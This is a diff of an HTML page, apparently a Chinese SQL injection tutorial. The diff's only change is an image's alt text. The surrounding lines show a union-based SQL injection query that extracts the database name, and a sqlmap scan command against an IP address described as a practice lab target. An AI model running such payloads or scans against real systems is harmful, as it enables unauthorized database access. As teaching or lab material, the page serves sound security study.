@@ -863,7 +863,7 @@ select * from users where username='dumb' and 1=2 union select 1,database(),3;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <hr>
-<h2 id="数据库注入"><a href="#数据库注入" class="headerlink" title="数据库注入"></a>数据库注入</h2><p><img src="/medias/images/image-20210630162749315.png" alt="images"></p>
+<h2 id="数据库注入"><a href="#数据库注入" class="headerlink" title="数据库注入"></a>数据库注入</h2><p><img src="/medias/images/image-20210630162749315.png" alt="数据库注入"></p>
 <h3 id="墨者Access注入测试"><a href="#墨者Access注入测试" class="headerlink" title="墨者Access注入测试"></a>墨者Access注入测试</h3><ul>
 <li>sqlmap扫描漏洞判断数据库<pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">219.153</span><span class="token number">.49</span><span class="token number">.228</span><span class="token punctuation">:</span><span class="token number">49079</span><span class="token operator">/</span>new_list<span class="token punctuation">.</span>asp?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span>v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <blockquote>
